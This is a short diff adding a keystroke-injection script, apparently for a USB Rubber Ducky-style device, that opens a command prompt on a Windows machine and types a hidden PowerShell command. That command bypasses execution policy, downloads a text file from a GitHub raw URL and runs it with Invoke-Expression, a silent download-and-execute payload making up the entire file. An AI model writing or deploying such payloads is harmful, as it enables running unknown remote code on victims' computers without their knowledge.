@@ -1,0 +1,14 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd /T:01
+DELAY 200
+ENTER
+DELAY 1000
+STRING cd %userprofile%
+DELAY 500
+ENTER
+DELAY 500
+STRING powershell -NoP -NonI -w h -Exec Bypass -c "& { $script = Invoke-WebRequest https://raw.githubusercontent.com/CYBER4CE/ST/master/p.txt; Invoke-Expression $($script.content); $script -eq $null; }"
+DELAY 200
+ENTER
